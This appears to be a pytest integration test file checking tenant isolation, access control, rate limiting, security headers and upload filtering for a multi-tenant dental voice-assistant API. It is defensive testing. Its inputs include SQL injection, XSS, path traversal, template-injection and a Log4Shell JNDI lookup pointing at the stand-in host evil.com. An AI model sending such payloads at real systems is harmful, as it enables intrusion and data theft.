"""
Multi-tenant security integration tests for Dental Voice AI.

Tests tenant isolation, data access control, and security boundaries
across the multi-tenant system.
"""

import pytest
import asyncio
from typing import Dict, Any
from fastapi.testclient import TestClient
from sqlalchemy.ext.asyncio import AsyncSession

from healthcare_voice_ai.main import app
from healthcare_voice_ai.core.database import get_async_db
from healthcare_voice_ai.core.models.database_models import User, Office, OfficeKnowledgeBase, FAQItem
from healthcare_voice_ai.core.auth import create_access_token, UserRole
from healthcare_voice_ai.core.exceptions import AuthenticationError, AuthorizationError


class TestMultiTenantSecurity:
    """Test multi-tenant security and isolation."""
    
    @pytest.fixture
    async def setup_tenants(self, async_db: AsyncSession):
        """Setup test tenants and users."""
        # Create tenant 1
        tenant1 = Office(
            tenant_id="tenant-1",
            name="Dental Office 1",
            email="office1@test.com",
            phone="+1234567890",
            address="123 Main St",
            status="active"
        )
        async_db.add(tenant1)
        
        # Create tenant 2
        tenant2 = Office(
            tenant_id="tenant-2",
            name="Dental Office 2",
            email="office2@test.com",
            phone="+1234567891",
            address="456 Oak Ave",
            status="active"
        )
        async_db.add(tenant2)
        
        # Create users for each tenant
        user1 = User(
            email="user1@tenant1.com",
            password_hash="hashed_password_1",
            role=UserRole.OFFICE_OWNER,
            tenant_id="tenant-1",
            is_active=True
        )
        async_db.add(user1)
        
        user2 = User(
            email="user2@tenant2.com",
            password_hash="hashed_password_2",
            role=UserRole.OFFICE_OWNER,
            tenant_id="tenant-2",
            is_active=True
        )
        async_db.add(user2)
        
        # Create admin user
        admin_user = User(
            email="admin@system.com",
            password_hash="hashed_admin_password",
            role=UserRole.ADMIN,
            tenant_id=None,
            is_active=True
        )
        async_db.add(admin_user)
        
        # Create knowledge bases for each tenant
        kb1 = OfficeKnowledgeBase(
            office_id="tenant-1",
            title="Office 1 Knowledge Base",
            description="Knowledge base for office 1"
        )
        async_db.add(kb1)
        
        kb2 = OfficeKnowledgeBase(
            office_id="tenant-2",
            title="Office 2 Knowledge Base",
            description="Knowledge base for office 2"
        )
        async_db.add(kb2)
        
        # Create FAQ items for each knowledge base
        faq1 = FAQItem(
            knowledge_base_id=kb1.id,
            question="What are your hours?",
            answer="We're open 9-5 Monday through Friday",
            keywords=["hours", "schedule", "open"]
        )
        async_db.add(faq1)
        
        faq2 = FAQItem(
            knowledge_base_id=kb2.id,
            question="Do you accept insurance?",
            answer="Yes, we accept most major insurance plans",
            keywords=["insurance", "payment", "coverage"]
        )
        async_db.add(faq2)
        
        await async_db.commit()
        
        return {
            "tenant1": tenant1,
            "tenant2": tenant2,
            "user1": user1,
            "user2": user2,
            "admin_user": admin_user,
            "kb1": kb1,
            "kb2": kb2,
            "faq1": faq1,
            "faq2": faq2
        }
    
    def test_tenant_isolation_data_access(self, client: TestClient, setup_tenants):
        """Test that tenants cannot access each other's data."""
        # Get access tokens for both users
        token1 = create_access_token({"sub": "user1@tenant1.com", "tenant_id": "tenant-1"})
        token2 = create_access_token({"sub": "user2@tenant2.com", "tenant_id": "tenant-2"})
        
        headers1 = {"Authorization": f"Bearer {token1}"}
        headers2 = {"Authorization": f"Bearer {token2}"}
        
        # User 1 tries to access their own knowledge base
        response1 = client.get("/data/knowledge-base", headers=headers1)
        assert response1.status_code == 200
        data1 = response1.json()
        assert data1["tenant_id"] == "tenant-1"
        
        # User 2 tries to access their own knowledge base
        response2 = client.get("/data/knowledge-base", headers=headers2)
        assert response2.status_code == 200
        data2 = response2.json()
        assert data2["tenant_id"] == "tenant-2"
        
        # Verify data isolation - each user only sees their own data
        assert data1["data"]["practice_info"]["name"] == "Dental Office 1"
        assert data2["data"]["practice_info"]["name"] == "Dental Office 2"
    
    def test_unauthorized_tenant_access(self, client: TestClient, setup_tenants):
        """Test that users cannot access other tenants' data."""
        # User 1 tries to access tenant 2's data by manipulating request
        token1 = create_access_token({"sub": "user1@tenant1.com", "tenant_id": "tenant-1"})
        headers1 = {"Authorization": f"Bearer {token1}"}
        
        # Try to access tenant 2's data by adding tenant_id to query params
        response = client.get("/data/knowledge-base?tenant_id=tenant-2", headers=headers1)
        
        # Should be denied due to tenant isolation middleware
        assert response.status_code in [403, 400]  # Forbidden or Bad Request
    
    def test_admin_cross_tenant_access(self, client: TestClient, setup_tenants):
        """Test that admin users can access any tenant's data."""
        # Admin user token
        admin_token = create_access_token({"sub": "admin@system.com", "role": "admin"})
        admin_headers = {"Authorization": f"Bearer {admin_token}"}
        
        # Admin should be able to access any tenant's data
        response1 = client.get("/data/knowledge-base?tenant_id=tenant-1", headers=admin_headers)
        assert response1.status_code == 200
        
        response2 = client.get("/data/knowledge-base?tenant_id=tenant-2", headers=admin_headers)
        assert response2.status_code == 200
    
    def test_tenant_isolation_middleware(self, client: TestClient, setup_tenants):
        """Test tenant isolation middleware enforcement."""
        # User without tenant context
        token = create_access_token({"sub": "user1@tenant1.com", "tenant_id": None})
        headers = {"Authorization": f"Bearer {token}"}
        
        # Should be denied access to tenant-specific endpoints
        response = client.get("/data/knowledge-base", headers=headers)
        assert response.status_code in [400, 403]  # Bad Request or Forbidden
    
    def test_calendar_tenant_isolation(self, client: TestClient, setup_tenants):
        """Test calendar endpoint tenant isolation."""
        token1 = create_access_token({"sub": "user1@tenant1.com", "tenant_id": "tenant-1"})
        token2 = create_access_token({"sub": "user2@tenant2.com", "tenant_id": "tenant-2"})
        
        headers1 = {"Authorization": f"Bearer {token1}"}
        headers2 = {"Authorization": f"Bearer {token2}"}
        
        # User 1 tries to access tenant 1's calendar
        response1 = client.get("/offices/tenant-1/calendar/availability?start_date=2024-01-01", headers=headers1)
        assert response1.status_code == 200
        
        # User 1 tries to access tenant 2's calendar (should be denied)
        response2 = client.get("/offices/tenant-2/calendar/availability?start_date=2024-01-01", headers=headers1)
        assert response2.status_code in [403, 400]  # Forbidden or Bad Request
        
        # User 2 tries to access tenant 2's calendar
        response3 = client.get("/offices/tenant-2/calendar/availability?start_date=2024-01-01", headers=headers2)
        assert response3.status_code == 200
    
    def test_data_service_tenant_isolation(self, client: TestClient, setup_tenants):
        """Test DataService tenant isolation."""
        token1 = create_access_token({"sub": "user1@tenant1.com", "tenant_id": "tenant-1"})
        token2 = create_access_token({"sub": "user2@tenant2.com", "tenant_id": "tenant-2"})
        
        headers1 = {"Authorization": f"Bearer {token1}"}
        headers2 = {"Authorization": f"Bearer {token2}"}
        
        # Test appointment search with tenant isolation
        response1 = client.get("/data/appointments/search?patient_name=John", headers=headers1)
        assert response1.status_code == 200
        data1 = response1.json()
        assert data1["tenant_id"] == "tenant-1"
        
        response2 = client.get("/data/appointments/search?patient_name=John", headers=headers2)
        assert response2.status_code == 200
        data2 = response2.json()
        assert data2["tenant_id"] == "tenant-2"
    
    def test_authentication_required(self, client: TestClient):
        """Test that authentication is required for protected endpoints."""
        # Try to access protected endpoint without authentication
        response = client.get("/data/knowledge-base")
        assert response.status_code == 401  # Unauthorized
        
        # Try to access protected endpoint with invalid token
        headers = {"Authorization": "Bearer invalid_token"}
        response = client.get("/data/knowledge-base", headers=headers)
        assert response.status_code == 401  # Unauthorized
    
    def test_role_based_access_control(self, client: TestClient, setup_tenants):
        """Test role-based access control."""
        # Create a readonly user
        readonly_token = create_access_token({
            "sub": "readonly@tenant1.com", 
            "tenant_id": "tenant-1",
            "role": "readonly"
        })
        readonly_headers = {"Authorization": f"Bearer {readonly_token}"}
        
        # Readonly user should be able to read data
        response = client.get("/data/knowledge-base", headers=readonly_headers)
        assert response.status_code == 200
        
        # Readonly user should not be able to create/modify data
        response = client.post("/data/knowledge-base", headers=readonly_headers, json={})
        assert response.status_code in [403, 405]  # Forbidden or Method Not Allowed
    
    def test_input_validation_security(self, client: TestClient, setup_tenants):
        """Test input validation and security measures."""
        token = create_access_token({"sub": "user1@tenant1.com", "tenant_id": "tenant-1"})
        headers = {"Authorization": f"Bearer {token}"}
        
        # Test SQL injection attempt
        malicious_input = "'; DROP TABLE users; --"
        response = client.get(f"/data/appointments/search?patient_name={malicious_input}", headers=headers)
        # Should not crash and should handle input safely
        assert response.status_code in [200, 400]  # OK or Bad Request
        
        # Test XSS attempt
        xss_input = "<script>alert('xss')</script>"
        response = client.get(f"/data/appointments/search?patient_name={xss_input}", headers=headers)
        # Should sanitize input
        assert response.status_code in [200, 400]  # OK or Bad Request
    
    def test_rate_limiting(self, client: TestClient, setup_tenants):
        """Test rate limiting functionality."""
        token = create_access_token({"sub": "user1@tenant1.com", "tenant_id": "tenant-1"})
        headers = {"Authorization": f"Bearer {token}"}
        
        # Make multiple requests quickly
        for i in range(10):
            response = client.get("/data/knowledge-base", headers=headers)
            if response.status_code == 429:  # Too Many Requests
                break
        
        # Should eventually hit rate limit
        assert response.status_code == 429
    
    def test_error_handling_security(self, client: TestClient, setup_tenants):
        """Test that error handling doesn't leak sensitive information."""
        token = create_access_token({"sub": "user1@tenant1.com", "tenant_id": "tenant-1"})
        headers = {"Authorization": f"Bearer {token}"}
        
        # Try to access non-existent resource
        response = client.get("/data/non-existent-endpoint", headers=headers)
        assert response.status_code == 404
        
        # Error response should not contain sensitive information
        error_data = response.json()
        assert "password" not in str(error_data).lower()
        assert "secret" not in str(error_data).lower()
        assert "key" not in str(error_data).lower()
    
    def test_tenant_context_extraction(self, client: TestClient, setup_tenants):
        """Test tenant context extraction from various sources."""
        token = create_access_token({"sub": "user1@tenant1.com", "tenant_id": "tenant-1"})
        headers = {"Authorization": f"Bearer {token}"}
        
        # Test tenant context from user token
        response = client.get("/data/knowledge-base", headers=headers)
        assert response.status_code == 200
        data = response.json()
        assert data["tenant_id"] == "tenant-1"
        
        # Test tenant context from path parameter
        response = client.get("/offices/tenant-1/calendar/availability?start_date=2024-01-01", headers=headers)
        assert response.status_code == 200
    
    def test_middleware_order(self, client: TestClient, setup_tenants):
        """Test that middleware executes in correct order."""
        token = create_access_token({"sub": "user1@tenant1.com", "tenant_id": "tenant-1"})
        headers = {"Authorization": f"Bearer {token}"}
        
        # Make request and check headers
        response = client.get("/data/knowledge-base", headers=headers)
        assert response.status_code == 200
        
        # Check that security headers are present
        assert "X-Content-Type-Options" in response.headers
        assert "X-Frame-Options" in response.headers
        assert "X-XSS-Protection" in response.headers
        
        # Check that request ID is present
        assert "X-Request-ID" in response.headers


class TestSecurityBoundaries:
    """Test security boundaries and attack prevention."""
    
    def test_cors_security(self, client: TestClient):
        """Test CORS security configuration."""
        # Test preflight request
        response = client.options("/data/knowledge-base", headers={
            "Origin": "https://malicious-site.com",
            "Access-Control-Request-Method": "GET"
        })
        
        # Should handle CORS properly
        assert response.status_code in [200, 204]
    
    def test_security_headers(self, client: TestClient):
        """Test security headers are present."""
        response = client.get("/health")
        
        # Check security headers
        assert response.headers.get("X-Content-Type-Options") == "nosniff"
        assert response.headers.get("X-Frame-Options") == "DENY"
        assert response.headers.get("X-XSS-Protection") == "1; mode=block"
        assert response.headers.get("Referrer-Policy") == "strict-origin-when-cross-origin"
    
    def test_input_sanitization(self, client: TestClient):
        """Test input sanitization and validation."""
        # Test with malicious input
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../etc/passwd",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for malicious_input in malicious_inputs:
            response = client.get(f"/health?test={malicious_input}")
            # Should not crash and should handle input safely
            assert response.status_code in [200, 400, 422]
    
    def test_file_upload_security(self, client: TestClient, setup_tenants):
        """Test file upload security measures."""
        token = create_access_token({"sub": "user1@tenant1.com", "tenant_id": "tenant-1"})
        headers = {"Authorization": f"Bearer {token}"}
        
        # Test with malicious file
        malicious_content = b"#!/bin/bash\necho 'malicious script'"
        files = {"faq_file": ("malicious.sh", malicious_content, "application/x-sh")}
        
        response = client.post("/offices/onboard/submit", headers=headers, files=files, data={
            "office_name": "Test Office",
            "phone": "+1234567890",
            "email": "test@office.com",
            "address": "123 Test St",
            "services": "General Dentistry"
        })
        
        # Should reject malicious file types
        assert response.status_code in [400, 415]  # Bad Request or Unsupported Media Type


@pytest.mark.asyncio
class TestAsyncSecurity:
    """Test async security scenarios."""
    
    async def test_concurrent_tenant_access(self, async_db: AsyncSession):
        """Test concurrent access to different tenants."""
        # This would test race conditions and concurrent access
        # Implementation would depend on specific async scenarios
        pass
    
    async def test_database_connection_security(self, async_db: AsyncSession):
        """Test database connection security and isolation."""
        # Test that database connections are properly isolated
        # and don't leak data between tenants
        pass
